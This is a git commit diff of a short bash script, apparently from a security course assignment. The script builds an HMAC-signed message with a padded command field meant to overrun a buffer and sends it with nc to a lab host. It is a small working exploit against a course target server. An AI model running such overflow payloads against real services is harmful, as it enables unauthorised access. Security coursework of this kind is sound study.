64c4914f87a588fefc8642825af55c9f2b2e9bd7
Jaan <jaan.tollander@gmail.com>
2018-10-04 10:26:46 +0300

    Buffer overrun modifications

--- assignment3/buffer_overrun.sh
+++ assignment3/buffer_overrun.sh
@@ -1,21 +1,22 @@
 #!/usr/bin/env bash
-KEYPHRASE=01234567890123456789
-USERNAME=452056
-COMMAND=01234567890123456789012
+KEYPHRASE="01234567890123456789"
+USERNAME="452056"
+COMMAND="01234567890123456789012"  # 40-9-6-2=23
+CLIENTCMDTAG="ClientCmd"
 
-echo "ClientCmd|${USERNAME}|${COMMAND}" > /tmp/hmac_string.in
+echo "${CLIENTCMDTAG}|${USERNAME}|${COMMAND}" > /tmp/hmac_string.in
 HEX_HMAC=$(openssl dgst -sha256 -hmac ${KEYPHRASE} /tmp/hmac_string.in | \
            grep -P -o '(?<== )[[:alnum:]]+')
 
+echo "${USERNAME};${COMMAND}${KEYPHRASE};${HEX_HMAC}"$'\n' > /tmp/msg.in
+nc device1.vikaa.fi 33892 < /tmp/msg.in
+
+echo
+echo
+echo "Inputs:"
 echo ${KEYPHRASE}
 echo ${USERNAME}
 echo ${COMMAND}
 echo $(cat /tmp/hmac_string.in)
 echo ${HEX_HMAC}
-
-echo "${USERNAME};${COMMAND}${KEYPHRASE};${HEX_HMAC}"$'\n' > /tmp/msg.in
 echo $(cat /tmp/msg.in)
-
-nc device1.vikaa.fi 33892 < /tmp/msg.in
-
-echo
